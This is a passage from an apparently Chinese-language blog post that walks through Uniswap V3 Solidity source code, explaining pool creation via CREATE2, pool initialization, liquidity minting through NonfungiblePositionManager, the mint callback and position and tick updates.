class="line">        // 使用 3个 map 说明了 v3 版本使用 (tokenA, tokenB, fee) 来作为一个交易对的键，即相同代币，不同费率之间的流动池不一样。</span><br><span class="line">        pool = IUniswapV3Factory(factory).getPool(token0, token1, fee);</span><br><span class="line"></span><br><span class="line">// 如果还没创建，则创建新的池子</span><br><span class="line">        if (pool == address(0)) &#123;</span><br><span class="line">            pool = IUniswapV3Factory(factory).createPool(token0, token1, fee);</span><br><span class="line">            // 池子进行初始化</span><br><span class="line">            IUniswapV3Pool(pool).initialize(sqrtPriceX96);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            (uint160 sqrtPriceX96Existing, , , , , , ) = IUniswapV3Pool(pool).slot0();</span><br><span class="line">            if (sqrtPriceX96Existing == 0) &#123;</span><br><span class="line">                IUniswapV3Pool(pool).initialize(sqrtPriceX96);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>2.进入到UniswapV3Factory合约的<code>createPool()</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">function createPool(</span><br><span class="line">    address tokenA,</span><br><span class="line">    address tokenB,</span><br><span class="line">    uint24 fee</span><br><span class="line">) external override noDelegateCall returns (address pool) &#123;</span><br><span class="line">    require(tokenA != tokenB);</span><br><span class="line">    (address token0, address token1) = tokenA &lt; tokenB ? (tokenA, tokenB) : (tokenB, tokenA);</span><br><span class="line">    require(token0 != address(0));</span><br><span class="line">    int24 tickSpacing = feeAmountTickSpacing[fee];</span><br><span class="line">    require(tickSpacing != 0);</span><br><span class="line">    require(getPool[token0][token1][fee] == address(0));</span><br><span class="line">    pool = deploy(address(this), token0, token1, fee, tickSpacing);</span><br><span class="line">    getPool[token0][token1][fee] = pool;</span><br><span class="line">    // populate mapping in the reverse direction, deliberate choice to avoid the cost of comparing addresses</span><br><span class="line">    getPool[token1][token0][fee] = pool;</span><br><span class="line">    emit PoolCreated(token0, token1, fee, tickSpacing, pool);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3.创建池子其实是到UniswapV3PoolDeployer合约进行实际的部署，可以看到是用CREATE2来部署的。因为是CREATE2部署的，因此我们可以在链下<a href="https://github.com/Uniswap/v3-periphery/blob/3514c56ccf84a2d32b623004e7c119494ac729cc/contracts/libraries/PoolAddress.sol#L15-L38">提前计算出来池子的地址</a>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">function deploy(</span><br><span class="line">    address factory,</span><br><span class="line">    address token0,</span><br><span class="line">    address token1,</span><br><span class="line">    uint24 fee,</span><br><span class="line">    int24 tickSpacing</span><br><span class="line">) internal returns (address pool) &#123;</span><br><span class="line">    parameters = Parameters(&#123;factory: factory, token0: token0, token1: token1, fee: fee, tickSpacing: tickSpacing&#125;);</span><br><span class="line">    // </span><br><span class="line">    pool = address(new UniswapV3Pool&#123;salt: keccak256(abi.encode(token0, token1, fee))&#125;());</span><br><span class="line">    delete parameters;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>4.池子合约的构造函数如下。</p><p>疑问：为什么不直接使用参数传递来对新合约的状态变量赋值呢？原因：CREATE2使用initcode和salt进行创建合约，而initcode是写死的，构造器的参数是拼接到initcode后面的，因此无法拼接构造器参数，否则每个池子的参数都是一样的。相反，如果是使用UniswapV3Factory合约的参数，则可以动态改变参数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">constructor() &#123;</span><br><span class="line">    int24 _tickSpacing;</span><br><span class="line">    // 反向查询 `UniswapV3Factory` 中的 parameters 值来进行初始变量的赋值。</span><br><span class="line">    (factory, token0, token1, fee, _tickSpacing) = IUniswapV3PoolDeployer(msg.sender).parameters();</span><br><span class="line">    tickSpacing = _tickSpacing;</span><br><span class="line"></span><br><span class="line">    maxLiquidityPerTick = Tick.tickSpacingToMaxLiquidityPerTick(_tickSpacing);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>5.最后完成初始化工作：此时池子中还没有流动性</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">  function initialize(uint160 sqrtPriceX96) external override &#123;</span><br><span class="line">      require(slot0.sqrtPriceX96 == 0, &#x27;AI&#x27;);</span><br><span class="line"></span><br><span class="line">      int24 tick = TickMath.getTickAtSqrtRatio(sqrtPriceX96);</span><br><span class="line"></span><br><span class="line">      (uint16 cardinality, uint16 cardinalityNext) = observations.initialize(_blockTimestamp());</span><br><span class="line">// 设置tick，初始价格费率等</span><br><span class="line">      slot0 = Slot0(&#123;</span><br><span class="line">          sqrtPriceX96: sqrtPriceX96,</span><br><span class="line">          tick: tick,</span><br><span class="line">          observationIndex: 0,</span><br><span class="line">          observationCardinality: cardinality,</span><br><span class="line">          observationCardinalityNext: cardinalityNext,</span><br><span class="line">          feeProtocol: 0,</span><br><span class="line">          unlocked: true</span><br><span class="line">      &#125;);</span><br><span class="line"></span><br><span class="line">      emit Initialize(sqrtPriceX96, tick);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h2 id="提供流动性"><a href="#提供流动性" class="headerlink" title="提供流动性"></a>提供流动性</h2><h3 id="整体流程"><a href="#整体流程" class="headerlink" title="整体流程"></a>整体流程</h3><p>在合约内，v3 会保存所有用户的流动性，代码内称作 <code>Position</code>，提供流动性的调用流程如下：</p><p><img src="/2023/08/05/03.Uniswap/09.uniswap_v3_code/image-20230805150555001.png" alt="image-20230805150555001"></p><p>用户首先和 <code>NonfungiblePositionManager</code> 合约交互，v3 这次将 LP token 改成了 ERC721 token，并且将 token 功能放到 <code>NonfungiblePositionManager</code> 合约中。这个合约替代用户完成提供流动性操作，然后根据将流动性的数据元记录下来，并给用户铸造一个 NFT Token.</p><p>1.首先调用NonfungiblePositionManager合约的<code>mint()</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">  function mint(MintParams calldata params)</span><br><span class="line">      external</span><br><span class="line">      payable</span><br><span class="line">      override</span><br><span class="line">      checkDeadline(params.deadline)</span><br><span class="line">.........</span><br><span class="line">      IUniswapV3Pool pool;</span><br><span class="line">      (liquidity, amount0, amount1, pool) = addLiquidity(</span><br><span class="line">          AddLiquidityParams(&#123;</span><br><span class="line">              token0: params.token0,</span><br><span class="line">              token1: params.token1,</span><br><span class="line">              fee: params.fee,</span><br><span class="line">              recipient: address(this),</span><br><span class="line">              tickLower: params.tickLower,</span><br><span class="line">              tickUpper: params.tickUpper,</span><br><span class="line">              amount0Desired: params.amount0Desired,</span><br><span class="line">              amount1Desired: params.amount1Desired,</span><br><span class="line">              amount0Min: params.amount0Min,</span><br><span class="line">              amount1Min: params.amount1Min</span><br><span class="line">          &#125;)</span><br><span class="line">      );</span><br><span class="line"></span><br><span class="line">      _mint(params.recipient, (tokenId = _nextId++));</span><br><span class="line">.........</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>2.进入<code>addLiquidity()</code>：</p><ul><li>传入的 lower/upper 价格是以 tick index 来表示的，因此需要在链下先计算好价格所对应的 tick index</li><li>传入的是流动性 L的大小</li><li>这里有一个回调函数的参数，v3 使用回调函数来完成进行流动性 token 的支付操作，</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">struct AddLiquidityParams &#123;</span><br><span class="line">    address token0;     // token0 的地址</span><br><span class="line">    address token1;     // token1 的地址</span><br><span class="line">    uint24 fee;         // 交易费率</span><br><span class="line">    address recipient;  // 流动性的所属人地址</span><br><span class="line">    int24 tickLower;    // 流动性的价格下限（以 token0 计价），这里传入的是 tick index</span><br><span class="line">    int24 tickUpper;    // 流动性的价格上线（以 token0 计价），这里传入的是 tick index</span><br><span class="line">    uint128 amount;     // 流动性 L 的值</span><br><span class="line">    uint256 amount0Max; // 提供的 token0 上限数</span><br><span class="line">    uint256 amount1Max; // 提供的 token1 上限数</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function addLiquidity(AddLiquidityParams memory params)</span><br><span class="line">    internal</span><br><span class="line">    returns (</span><br><span class="line">        uint256 amount0,</span><br><span class="line">        uint256 amount1,</span><br><span class="line">        IUniswapV3Pool pool</span><br><span class="line">    )</span><br><span class="line">&#123;</span><br><span class="line">    PoolAddress.PoolKey memory poolKey =</span><br><span class="line">        PoolAddress.PoolKey(&#123;token0: params.token0, token1: params.token1, fee: params.fee&#125;);</span><br><span class="line"></span><br><span class="line">    // 这里不需要访问 factory 合约，可以通过 token0, token1, fee 三个参数计算出 pool 的合约地址</span><br><span class="line">    pool = IUniswapV3Pool(PoolAddress.computeAddress(factory, poolKey));</span><br><span class="line"></span><br><span class="line">    (amount0, amount1) = pool.mint(</span><br><span class="line">        params.recipient,</span><br><span class="line">        params.tickLower,</span><br><span class="line">        params.tickUpper,</span><br><span class="line">        params.amount,</span><br><span class="line">        // 这里是 pool 合约回调所使用的参数</span><br><span class="line">        abi.encode(MintCallbackData(&#123;poolKey: poolKey, payer: msg.sender&#125;))</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    require(amount0 &lt;= params.amount0Max);</span><br><span class="line">    require(amount1 &lt;= params.amount1Max);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3.进行UniswapV3Pool的<code>mint()</code>，其中调用了<code>_modifyPosition()</code>和<code>ModifyPositionParams()</code>获得一些参数。这一步做了很多操作，见具体过程分析。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">function mint(</span><br><span class="line">    address recipient,</span><br><span class="line">    int24 tickLower,</span><br><span class="line">    int24 tickUpper,</span><br><span class="line">    uint128 amount,</span><br><span class="line">    bytes calldata data</span><br><span class="line">) external override lock returns (uint256 amount0, uint256 amount1) &#123;</span><br><span class="line">    require(amount &gt; 0);</span><br><span class="line">    (, int256 amount0Int, int256 amount1Int) =</span><br><span class="line">        _modifyPosition(</span><br><span class="line">            ModifyPositionParams(&#123;</span><br><span class="line">                owner: recipient,</span><br><span class="line">                tickLower: tickLower,</span><br><span class="line">                tickUpper: tickUpper,</span><br><span class="line">                liquidityDelta: int256(amount).toInt128()</span><br><span class="line">            &#125;)</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">    amount0 = uint256(amount0Int);</span><br><span class="line">    amount1 = uint256(amount1Int);</span><br><span class="line"></span><br><span class="line">    uint256 balance0Before;</span><br><span class="line">    uint256 balance1Before;</span><br><span class="line">    // 获取当前池中的 x token, y token 余额</span><br><span class="line">    if (amount0 &gt; 0) balance0Before = balance0();</span><br><span class="line">    if (amount1 &gt; 0) balance1Before = balance1();</span><br><span class="line">    // 将需要的 x token 和 y token 数量传给回调函数，这里预期回调函数会将指定数量的 token 发送到合约中</span><br><span class="line">    IUniswapV3MintCallback(msg.sender).uniswapV3MintCallback(amount0, amount1, data);</span><br><span class="line">    // 回调完成后，检查发送至合约的 token 是否复合预期，如果不满足检查则回滚交易</span><br><span class="line">    if (amount0 &gt; 0) require(balance0Before.add(amount0) &lt;= balance0(), &#x27;M0&#x27;);</span><br><span class="line">    if (amount1 &gt; 0) require(balance1Before.add(amount1) &lt;= balance1(), &#x27;M1&#x27;);</span><br><span class="line"></span><br><span class="line">    emit Mint(msg.sender, recipient, tickLower, tickUpper, amount, amount0, amount1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>4.进入回调函数<code>uniswapV3MintCallback()</code>。</p><p>使用回调函数原因：将 <code>Position</code> 的 owner 和实际流动性 token 支付者解耦。这样可以让中间合约来管理用户的流动性，并将流动性 token 化。关于 token 化，Uniswap v3 默认实现了 ERC721 token（因为即使是同一个池子，流动性之间差异也也很大）。</p><p>例如，当用户通过 <code>NonfungiblePositionManager</code> 来提供流动性时，对于 <code>UniswapV3Pool</code> 合约来说，这个 <code>Position</code> 的 owner 是 <code>NonfungiblePositionManager</code>，而 <code>NonfungiblePositionManager</code> 再通过 NFT Token 将 <code>Position</code> 与用户关联起来。这样用户就可以将 LP token 进行转账或者抵押类操作。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">struct MintCallbackData &#123;</span><br><span class="line">    PoolAddress.PoolKey poolKey;</span><br><span class="line">    address payer;         // 支付 token 的地址</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/// @inheritdoc IUniswapV3MintCallback</span><br><span class="line">function uniswapV3MintCallback(</span><br><span class="line">    uint256 amount0Owed,</span><br><span class="line">    uint256 amount1Owed,</span><br><span class="line">    bytes calldata data</span><br><span class="line">) external override &#123;</span><br><span class="line">    MintCallbackData memory decoded = abi.decode(data, (MintCallbackData));</span><br><span class="line">    CallbackValidation.verifyCallback(factory, decoded.poolKey);</span><br><span class="line"></span><br><span class="line">    // 根据传入的参数，使用 transferFrom 代用户向 Pool 中支付 token</span><br><span class="line">    if (amount0Owed &gt; 0) pay(decoded.poolKey.token0, decoded.payer, msg.sender, amount0Owed);</span><br><span class="line">    if (amount1Owed &gt; 0) pay(decoded.poolKey.token1, decoded.payer, msg.sender, amount1Owed);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>5.最后在NonfungiblePositionManager再次<code>mint()</code>，铸造流动性NFT</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">function mint(MintParams calldata params)</span><br><span class="line">    external</span><br><span class="line">    payable</span><br><span class="line">    override</span><br><span class="line">    checkDeadline(params.deadline)</span><br><span class="line">    returns (</span><br><span class="line">        uint256 tokenId,</span><br><span class="line">        uint256 amount0,</span><br><span class="line">        uint256 amount1</span><br><span class="line">    )</span><br><span class="line">&#123;</span><br><span class="line">    IUniswapV3Pool pool;</span><br><span class="line">    // 这里是添加流动性，并完成 x token 和 y token 的发送</span><br><span class="line">    (amount0, amount1, pool) = addLiquidity(</span><br><span class="line">        AddLiquidityParams(&#123;</span><br><span class="line">            token0: params.token0,</span><br><span class="line">            token1: params.token1,</span><br><span class="line">            fee: params.fee,</span><br><span class="line">            recipient: address(this),</span><br><span class="line">            tickLower: params.tickLower,</span><br><span class="line">            tickUpper: params.tickUpper,</span><br><span class="line">            amount: params.amount,</span><br><span class="line">            amount0Max: params.amount0Max,</span><br><span class="line">            amount1Max: params.amount1Max</span><br><span class="line">        &#125;)</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    // 铸造 ERC721 token 给用户，用来代表用户所持有的流动性</span><br><span class="line">    _mint(params.recipient, (tokenId = _nextId++));</span><br><span class="line"></span><br><span class="line">    bytes32 positionKey = PositionKey.compute(address(this), params.tickLower, params.tickUpper);</span><br><span class="line">    (, uint256 feeGrowthInside0LastX128, uint256 feeGrowthInside1LastX128, , ) = pool.positions(positionKey);</span><br><span class="line"></span><br><span class="line">    // idempotent set</span><br><span class="line">    uint80 poolId =</span><br><span class="line">        cachePoolKey(</span><br><span class="line">            address(pool),</span><br><span class="line">            PoolAddress.PoolKey(&#123;token0: params.token0, token1: params.token1, fee: params.fee&#125;)</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">    // 用 ERC721 的 token ID 作为键，将用户提供流动性的元信息保存起来</span><br><span class="line">    _positions[tokenId] = Position(&#123;</span><br><span class="line">        nonce: 0,</span><br><span class="line">        operator: address(0),</span><br><span class="line">        poolId: poolId,</span><br><span class="line">        tickLower: params.tickLower,</span><br><span class="line">        tickUpper: params.tickUpper,</span><br><span class="line">        liquidity: params.amount,</span><br><span class="line">        feeGrowthInside0LastX128: feeGrowthInside0LastX128,</span><br><span class="line">        feeGrowthInside1LastX128: feeGrowthInside1LastX128,</span><br><span class="line">        tokensOwed0: 0,</span><br><span class="line">        tokensOwed1: 0</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来，详细分析每一步做了什么事情</p><h3 id="具体过程"><a href="#具体过程" class="headerlink" title="具体过程"></a>具体过程</h3><h4 id="postion-更新"><a href="#postion-更新" class="headerlink" title="postion 更新"></a>postion 更新</h4><p>第三步的<code>mint()</code>中，会进行postion更新</p><p>流动性的添加主要在 <code>UniswapV3Pool._modifyPosition</code> 中，它会先调用 <code>_updatePosition</code> 来创建或修改一个用户的 <code>Position</code>，省略其中的非关键步骤：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">function _updatePosition(</span><br><span class="line">    address owner,</span><br><span class="line">    int24 tickLower,</span><br><span class="line">    int24 tickUpper,</span><br><span class="line">    int128 liquidityDelta,</span><br><span class="line">    int24 tick</span><br><span class="line">) private returns (Position.Info storage position) &#123;</span><br><span class="line">    // 获取用户的 Postion</span><br><span class="line">    position = positions.get(owner, tickLower, tickUpper);</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    // 根据传入的参数修改 Position 对应的 lower/upper tick 中</span><br><span class="line">    // 的数据，这里可以是增加流动性，也可以是移出流动性</span><br><span class="line">    bool flippedLower;</span><br><span class="line">    bool flippedUpper;</span><br><span class="line">    if (liquidityDelta != 0) &#123;</span><br><span class="line">        uint32 blockTimestamp = _blockTimestamp();</span><br><span class="line"></span><br><span class="line">        // 更新 lower tikc 和 upper tick</span><br><span class="line">        // fippedX 变量表示是此 tick 的引用状态是否发生变化，即</span><br><span class="line">        // 被引用 -&gt; 未被引用 或</span><br><span class="line">        // 未被引用 -&gt; 被引用</span><br><span class="line">        // 后续需要根据这个变量的值来更新 tick 位图</span><br><span class="line">        flippedLower = ticks.update(</span><br><span class="line">            tickLower,</span><br><span class="line">            tick,</span><br><span class="line">            liquidityDelta,</span><br><span class="line">            _feeGrowthGlobal0X128,</span><br><span class="line">            _feeGrowthGlobal1X128,</span><br><span class="line">            false,</span><br><span class="line">            maxLiquidityPerTick</span><br><span class="line">        );</span><br><span class="line">        flippedUpper = ticks.update(</span><br><span class="line">            tickUpper,</span><br><span class="line">            tick,</span><br><span class="line">            liquidityDelta,</span><br><span class="line">            _feeGrowthGlobal0X128,</span><br><span class="line">            _feeGrowthGlobal1X128,</span><br><span class="line">            true,</span><br><span class="line">            maxLiquidityPerTick</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        // 如果一个 tick 第一次被引用，或者移除了所有引用</span><br><span class="line">        // 那么更新 tick 位图</span><br><span class="line">        if (flippedLower) &#123;</span><br><span class="line">            tickBitmap.flipTick(tickLower, tickSpacing);</span><br><span class="line">            secondsOutside.initialize(tickLower, tick, tickSpacing, blockTimestamp);</span><br><span class="line">        &#125;</span><br><span class="line">        if (flippedUpper) &#123;</span><br><span class="line">            tickBitmap.flipTick(tickUpper, tickSpacing);</span><br><span class="line">            secondsOutside.initialize(tickUpper, tick, tickSpacing, blockTimestamp);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">    // 更新 position 中的数据</span><br><span class="line">    position.update(liquidityDelta, feeGrowthInside0X128, feeGrowthInside1X128);</span><br><span class="line"></span><br><span class="line">    // 如果移除了对 tick 的引用，那么清除之前记录的元数据</span><br><span class="line">    // 这只会发生在移除流动性的操作中</span><br><span class="line">    if (liquidityDelta &lt; 0) &#123;</span><br><span class="line">        if (flippedLower) &#123;</span><br><span class="line">            ticks.clear(tickLower);</span><br><span class="line">            secondsOutside.clear(tickLower, tickSpacing);</span><br><span class="line">        &#125;</span><br><span class="line">        if (flippedUpper) &#123;</span><br><span class="line">            ticks.clear(tickUpper);</span><br><span class="line">            secondsOutside.clear(tickUpper, tickSpacing);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先忽略费率相关的操作，这个函数所做的操作是：</p><ul><li>添加/移除流动性时，先更新这个 Positon 对应的 lower/upper tick 中记录的元数据</li><li>更新 position</li><li>根据需要更新 tick 位图</li></ul><p>Postion 是以 <code>owner</code>, <code>lower tick</code>, <code>uppper tick</code> 作为键来存储的，注意这里的 owner 实际上是 <code>NonfungiblePositionManager</code> 合约的地址。这样当多个用户在同一个价格区间提供流动性时，在底层的 <code>UniswapV3Pool</code> 合约中会将他们合并存储。而在 <code>NonfungiblePositionManager</code> 合约中会按用户来区别每个用户拥有的 <code>Position</code>.</p><p>Postion 中包含的字段中，除去费率相关的字段，只有一个即流动性 L：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">library Position &#123;</span><br><span class="line">    // info stored for each user&#x27;s position</span><br><span class="line">    struct Info &#123;</span><br><span class="line">        // 此 position 中包含的流动性大小，即 L 值</span><br><span class="line">        uint128 liquidity;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>更新 position 只需要一行调用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">position.update(liquidityDelta, feeGrowthInside0X128, feeGrowthInside1X128);</span><br></pre></td></tr></table></figure><p>其中包含了 position 中流动性 L的更新，以及手续费相关的计算。</p><h4 id="tick-管理"><a href="#tick-管理" class="headerlink" title="tick 管理"></a>tick 管理</h4><p>第三步的<code>mint()</code>中，会在position更新中进行tick 管理。在 <code>UniswapV3Pool</code> 合约中有两个状态变量记录了 tick 相关的信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">    // tick 元数据管理的库</span><br><span class="line">    using Tick for mapping(int24 =&gt; Tick.Info);</span><br><span class="line">    // tick 位图槽位的库</span><br><span class="line">    using TickBitmap for mapping(int16 =&gt; uint256);</span><br><span class="line"></span><br><span class="line">    // 记录了一个 tick 包含的元数据，这里只会包含所有 Position 的 lower/upper ticks</span><br><span class="line">    mapping(int24 =&gt; Tick.Info) public override ticks;</span><br><span class="line">    // tick 位图，因为这个位图比较长（一共有 887272x2 个位），大部分的位不需要初始化</span><br><span class="line">    // 因此分成两级来管理，每 256 位为一个单位，一个单位称为一个 word</span><br><span class="line">    // map 中的键是 word 的索引</span><br><span class="line">    mapping(int16 =&gt; uint256) public override tickBitmap;</span><br><span class="line"></span><br><span class="line">library Tick &#123;</span><br><span class="line">    ...</span><br><span class="line">    // tick 中记录的数据</span><br><span class="line">    struct Info &#123;</span><br><span class="line">        // 记录了所有引用这个 tick 的 position 流动性的和</span><br><span class="line">        uint128 liquidityGross;</span><br><span class="line">        // 当此 tick 被越过时（从左至右），池子中整体流动性需要变化的值</span><br><span class="line">        int128 liquidityNet;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>以下是 <code>tick.update</code> 函数：</p><figure 